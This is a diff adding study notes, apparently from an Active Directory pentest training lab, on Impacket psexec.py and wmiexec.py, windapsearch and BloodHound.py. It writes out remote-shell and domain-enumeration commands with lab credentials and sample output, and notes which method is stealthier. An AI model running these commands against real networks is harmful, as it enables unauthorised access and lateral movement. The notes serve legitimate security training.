@@ -554,11 +554,264 @@ Using it in this manner will print out all domain users by name and RID. Our enu
 
 ## Impacket Toolkit
 
+Impacket is a versatile toolkit that provides us with many different ways to enumerate, interact, and exploit Windows protocols and find the information we need using Python. The tool is actively maintained and has many contributors, especially when new attack techniques arise. We could perform many other actions with Impacket, but we will only highlight a few in this section; `wmiexec.py` and `psexec.py`. Earlier in the poisoning section, we grabbed a hash for the user `wley` with `Responder` and cracked it to obtain the password `transporter@4`. We will see in the next section that this user is a local admin on the `ACADEMY-EA-FILE` host. We will utilize the credentials for the next few actions.
 
+### Psexec.py
 
+The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.
 
+To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.
+```
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+```
 
+Once we execute the psexec module, it drops us into the `system32` directory on the target host. We ran the `whoami` command to verify, and it confirmed that we landed on the host as `SYSTEM`. From here, we can perform almost any task on this host; anything from further enumeration to persistence and lateral movement
 
+### wmiexec.py
 
+Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.
+
+```
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+```
+
+Note that this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command. The downside of this is that if a vigilant defender checks event logs and looks at event ID 4688: A new process has been created, they will see a new process created to spawn cmd.exe and issue a command. This isn't always malicious activity since many organizations utilize WMI to administer computers, but it can be a tip-off in an investigation.
+
+---
+
+## Windapsearch
+
+Windapsearch is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries. It is present in our attack host's /opt/windapsearch/ directory.
+
+```
+$ windapsearch.py -h
+
+usage: windapsearch.py [-h] [-d DOMAIN] [--dc-ip DC_IP] [-u USER]
+                       [-p PASSWORD] [--functionality] [-G] [-U] [-C]
+                       [-m GROUP_NAME] [--da] [--admin-objects] [--user-spns]
+                       [--unconstrained-users] [--unconstrained-computers]
+                       [--gpos] [-s SEARCH_TERM] [-l DN]
+                       [--custom CUSTOM_FILTER] [-r] [--attrs ATTRS] [--full]
+                       [-o output_dir]
+
+Script to perform Windows domain enumeration through LDAP queries to a Domain
+Controller
+
+optional arguments:
+  -h, --help            show this help message and exit
+
+Domain Options:
+  -d DOMAIN, --domain DOMAIN
+                        The FQDN of the domain (e.g. 'lab.example.com'). Only
+                        needed if DC-IP not provided
+  --dc-ip DC_IP         The IP address of a domain controller
+
+Bind Options:
+  Specify bind account. If not specified, anonymous bind will be attempted
+
+  -u USER, --user USER  The full username with domain to bind with (e.g.
+                        'ropnop@lab.example.com' or 'LAB\ropnop'
+  -p PASSWORD, --password PASSWORD
+                        Password to use. If not specified, will be prompted
+                        for
+
+Enumeration Options:
+  Data to enumerate from LDAP
+
+  --functionality       Enumerate Domain Functionality level. Possible through
+                        anonymous bind
+  -G, --groups          Enumerate all AD Groups
+  -U, --users           Enumerate all AD Users
+  -PU, --privileged-users
+                        Enumerate All privileged AD Users. Performs recursive
+                        lookups for nested members.
+  -C, --computers       Enumerate all AD Computers
+
+  <SNIP>
+```
+
+We have several options with Windapsearch to perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The `--da` (enumerate domain admins group members ) option and the `-PU` ( find privileged users) options. The `-PU` option is interesting because it will perform a recursive search for users with nested group membership.
+
+### Windapsearch - Domain Admins
+
+```
+$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+
+[+] Using Domain Controller at: 172.16.5.5
+[+] Getting defaultNamingContext from Root DSE
+[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
+[+] Attempting bind
+[+]	...success! Binded as: 
+[+]	 u:INLANEFREIGHT\forend
+[+] Attempting to enumerate all Domain Admins
+[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[+]	Found 28 Domain Admins:
+
+cn: Administrator
+userPrincipalName: administrator@inlanefreight.local
+
+cn: lab_adm
+
+cn: Matthew Morgan
+userPrincipalName: mmorgan@inlanefreight.local
+
+<SNIP>
+```
+
+From the results in the shell above, we can see that it enumerated 28 users from the Domain Admins group. Take note of a few users we have already seen before and may even have a hash or cleartext password like `wley`, `svc_qualys`, and `lab_adm`.
+
+To identify more potential users, we can run the tool with the `-PU` flag and check for users with elevated privileges that may have gone unnoticed. This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.
+
+### Windapsearch - Privileged Users
+
+```
+$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+
+[+] Using Domain Controller at: 172.16.5.5
+[+] Getting defaultNamingContext from Root DSE
+[+]     Found: DC=INLANEFREIGHT,DC=LOCAL
+[+] Attempting bind
+[+]     ...success! Binded as:
+[+]      u:INLANEFREIGHT\forend
+[+] Attempting to enumerate all AD privileged users
+[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[+]     Found 28 nested users for group Domain Admins:
+
+cn: Administrator
+userPrincipalName: administrator@inlanefreight.local
+
+cn: lab_adm
+
+cn: Angela Dunn
+userPrincipalName: adunn@inlanefreight.local
+
+cn: Matthew Morgan
+userPrincipalName: mmorgan@inlanefreight.local
+
+cn: Dorothy Click
+userPrincipalName: dclick@inlanefreight.local
+
+<SNIP>
+
+[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[+]     Found 3 nested users for group Enterprise Admins:
+
+cn: Administrator
+userPrincipalName: administrator@inlanefreight.local
+
+cn: lab_adm
+
+cn: Sharepoint Admin
+userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL
+
+<SNIP>
+```
+
+---
+
+## Bloodhound.py
+
+[BloodHound](https://github.com/dirkjanm/BloodHound.py) is one of the most impactful Active Directory security auditing tools available and invaluable for penetration testers. It transforms large datasets into graphical "attack paths," revealing where user access may lead and exposing nuanced AD flaws that other tools would miss. Using graph theory, it visualizes relationships and uncovers difficult or impossible-to-detect attack paths.
+
+**Components:**
+- **Collectors (ingestors):** SharpHound (C# for Windows) or BloodHound.py (Python)
+- **GUI tool:** Uploads collected JSON data and runs pre-built or custom [Cypher queries](https://specterops.io/blog/2017/09/18/bloodhound-intro-to-cypher/)
+
+**Data collected:** Users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer/user properties, RDP/WinRM access, etc.
+
+**BloodHound.py advantages:**
+The community-developed Python port (requiring Impacket, `ldap3`, and `dnspython`) enables collection from Linux attack hosts when lacking domain-joined Windows access. This avoids running collectors on domain hosts, reducing detection risk—though even remote execution may trigger alerts in well-protected environments.
+
+```
+$ bloodhound-python -h
+
+usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-u USERNAME]
+                         [-p PASSWORD] [-k] [--hashes HASHES] [-ns NAMESERVER]
+                         [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-d DOMAIN]
+                         [-dc HOST] [-gc HOST] [-w WORKERS] [-v]
+                         [--disable-pooling] [--disable-autogc] [--zip]
+
+Python based ingestor for BloodHound
+For help or reporting issues, visit https://github.com/Fox-IT/BloodHound.py
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD
+                        Which information to collect. Supported: Group,
+                        LocalAdmin, Session, Trusts, Default (all previous),
+                        DCOnly (no computer connections), DCOM, RDP,PSRemote,
+                        LoggedOn, ObjectProps, ACL, All (all except LoggedOn).
+                        You can specify more than one by separating them with
+                        a comma. (default: Default)
+  -u USERNAME, --username USERNAME
+                        Username. Format: username[@domain]; If the domain is
+                        unspecified, the current domain is used.
+  -p PASSWORD, --password PASSWORD
+                        Password
+
+  <SNIP>
+```
+
+As we can see the tool accepts various collection methods with the `-c` or `--collectionmethod` flag. We can retrieve specific data such as user sessions, users and groups, object properties, ACLS, or select `all` to gather as much data as possible. Let's run it this way.
+
+### Executing BloodHound.py
+
+```
+$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
+
+INFO: Found AD domain: inlanefreight.local
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 1 domains
+INFO: Found 2 domains in the forest
+INFO: Found 564 computers
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 2951 users
+INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 183 groups
+INFO: Found 2 trusts
+INFO: Starting computer enumeration with 10 workers
+
+<SNIP>
+```
+
+The command above executed Bloodhound.py with the user `forend`. We specified our nameserver as the Domain Controller with the `-ns` flag and the domain, INLANEFREIGHt.LOCAL with the `-d` flag. The `-c all` flag told the tool to run all checks. Once the script finishes, we will see the output files in the current working directory in the format of <date_object.json>.
+
+**Viewing the Results:**
+```
+$ ls
+
+20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json
+```
+
+**Upload the Zip File into the BloodHound GUI**
+
+Start the neo4j service with `sudo neo4j start` to initialize the database for data loading and Cypher queries.
+
+Launch the BloodHound GUI by typing `bloodhound` on your Linux attack host (when logged in via `freerdp`). If credentials are required, use:
+* `user == neo4j` / `pass == HTB_@cademy_stdnt!`
+
+**Uploading data:**
+Once BloodHound opens with a blank interface, upload the collected data:
+1. Optionally, zip all JSON files: `zip -r ilfreight_bh.zip *.json`
+2. Click the `Upload Data` button (right side of window)
+3. Select the zip file or individual JSON files
+4. Click `Open`
+
+<img width="1809" height="1068" alt="image" src="https://github.com/user-attachments/assets/1335fce9-a765-443e-bce6-46b36a551d80" />
+
+Now that the data is loaded, we can use the Analysis tab to run queries against the database. These queries can be custom and specific to what you decide using [custom Cypher queries](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/). There are many great cheat sheets to help us here. As seen below, we can use the built-in `Path Finding` queries on the `Analysis tab` on the `Left` side of the window.
+
+<img width="1809" height="1073" alt="image" src="https://github.com/user-attachments/assets/67346ca7-f43a-49aa-b6f3-426b5ede7570" />
+
+The `Find Shortest Paths To Domain Admins` query maps logical paths through users, groups, hosts, ACLs, GPOs, and their relationships that could enable privilege escalation to Domain Administrator. This is invaluable for planning lateral movement.
+
+**Features to explore:**
+- **Database Info tab:** Review uploaded data statistics
+- **Node Info tab:** Search for nodes (e.g., `Domain Users`) and examine all available options
+- **Analysis tab:** Use pre-built queries to quickly identify domain takeover paths
+- **Raw Query box:** Experiment with custom Cypher queries from cheatsheets—paste queries at the bottom and hit enter
+- **Settings menu:** Click the gear icon to adjust node/edge display, enable query debug mode, and toggle dark mode
+
+---
 
 
